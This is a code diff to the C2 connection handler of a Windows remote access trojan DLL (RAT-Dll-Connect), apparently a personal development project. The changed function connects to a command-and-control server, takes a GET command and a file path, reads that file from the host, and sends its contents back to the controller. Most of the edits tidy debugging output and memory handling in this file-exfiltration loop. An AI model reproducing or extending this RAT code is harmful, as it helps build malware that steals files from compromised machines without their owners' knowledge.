@@ -5,6 +5,13 @@
 #include "RAT-Dll-Connect.h"
 
 
+/** This function will serve as our main 'handler' for C2 requests
+*       It will continously serve our server connection until the connection is closed, reading request types and responding to them as needed
+params: 
+* N/A
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
 INT startListen()
 {
     WORD wsaVersion;
@@ -28,7 +35,7 @@ INT startListen()
         goto cleanup;
     }
 
-    OutputDebugStringA("WSAStartup was successful! \n");
+    OutputDebugStringA("RAT-Dll-Connect::startListen - WSAStartup was successful! \n");
 
     // Information for target
     client.sin_family = AF_INET;
@@ -93,29 +100,32 @@ INT startListen()
         // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
     do
     {
-        printf("Waiting for more bytes... \n");
+        OutputDebugStringA("RAT-Dll::startListen - Connection from C2 recieved! Waiting for command... \n");
         status = recv(clientSock, recvBuf, recvBufLen, 0);
         if (status > 0)
         {
-             printf("Bytes received: %d \n", status);
-             printf("bytes: %s\n", &recvBuf);
+             // Add put file here...
 
-             // Add put file here
-
+            // C2 told us to get a file so lets get the file path first 
              if (strcmp((const char*)&recvBuf, GET) == 0)
              {
-                 // Will have to receive again for the filepath OR put it in the same packet...
-                    // Prob safer to break up packets, could add delays etc
                  status = recv(clientSock, recvBuf, recvBufLen, 0);
                  if (status != SOCKET_ERROR)
                  {
-                     sprintf_s(msgBuf, "Performing get file on %s...\n", recvBuf);
+                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing get file on %s...\n", recvBuf);
                      OutputDebugStringA(msgBuf);
 
                      char** fileBytes  =(char**)malloc(sizeof(char*));
+                     if (fileBytes == NULL)
+                     {
+                         OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
+                         status = FAILURE;
+                         goto cleanup;
+                     }
+
                      DWORD bufferSize = 0;
 
-                    status = performGetFile((const char*)&recvBuf, *fileBytes, &bufferSize);
+                    status = performGetFile((const char*)&recvBuf, fileBytes, &bufferSize);
                      if (status != SUCCESS)
                      {
                          // Send back failure here as well 
@@ -124,12 +134,14 @@ INT startListen()
                          OutputDebugStringA(msgBuf);
                          goto cleanup;
                      }
-                     // was causing crash which ended our main process 
-                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %s bytes from file\n", *fileBytes);
+                
+                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %d bytes from file\n", bufferSize);
                      OutputDebugStringA(msgBuf);
-                     OutputDebugStringA("Sending status SUCCESS back to C2; sending buffer back to C2...\n");
 
-                     status = send(clientSock, "SUCCESS", 8, 0);
+                     OutputDebugStringA("RAT-Dll-Connect::startListen - Sending status SUCCESS back to C2...\n");
+
+                     // Change this to code constants later... bit dumb to have string here but whatever 
+                     status = send(clientSock, "SUCCESS", 7, 0);
                      if (status == SOCKET_ERROR)
                      {
                          sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
@@ -138,7 +150,8 @@ INT startListen()
                          goto cleanup;
                      }
 
-                     // Fail here because of our pointer?
+                     OutputDebugStringA("RAT-Dll-Connect::startListen - Sending buffer back to C2...\n");
+
                      status = send(clientSock, *fileBytes, bufferSize, 0);
                      if (status == SOCKET_ERROR)
                      {
@@ -147,6 +160,10 @@ INT startListen()
                          status = WSAGetLastError();
                          goto cleanup;
                      }
+
+                     // Free the buffer we point to then free the memory we allocated for the pointer
+                     free(*fileBytes);
+                     free(fileBytes);
                  }
                  // Failed to get our file path...
                  else
@@ -155,32 +172,18 @@ INT startListen()
                      status = FAILURE;
                      goto cleanup;
                  }
-
-                 
              }
-
-             // check for other functionality 
-
-             // dont need to worry about sending bytes back yet just read for our code and react as needed
-             /**
-            sendStatus = send(clientSock, recvBuf, status, 0);
-            if (sendStatus == SOCKET_ERROR)
-            {
-                printf("Send error: %d \n", sendStatus);
-                closesocket(clientSock);
-                WSACleanup();
-                return FALSE;
-            }
-            printf("Bytes sent: %d \n", sendStatus);
-            */
         }
+
         else if (status == 0)
         {
-            printf("Closing socket... \n");
+            OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (file path); attempting to recv again...\n");
         }
+
         else
         {
-            printf("Recv failed with error %d \n", WSAGetLastError());
+            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from recv (file path) %d\n", WSAGetLastError());
+            OutputDebugStringA(msgBuf);
             closesocket(clientSock);
             WSACleanup();
             return FALSE;
@@ -190,11 +193,12 @@ INT startListen()
 
     OutputDebugStringA("RAT-Dll::startListen - status < 0 so we're exiting...\n");
 
-    // shutdown connection since we're done
+    // Shutdown connection since we're done
     status = shutdown(clientSock, SD_SEND);
     if (status == SOCKET_ERROR)
     {
-        printf("Shutdown failed with error: %d \n", WSAGetLastError());
+        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from shutdown %d\n", WSAGetLastError());
+        OutputDebugStringA(msgBuf);
         closesocket(clientSock);
         WSACleanup();
         return FALSE;
@@ -203,7 +207,7 @@ INT startListen()
     closesocket(clientSock);
     WSACleanup();
 
-    // Parse initial packet data and call appropiate handler from here
+
 cleanup:
     return status;
 }
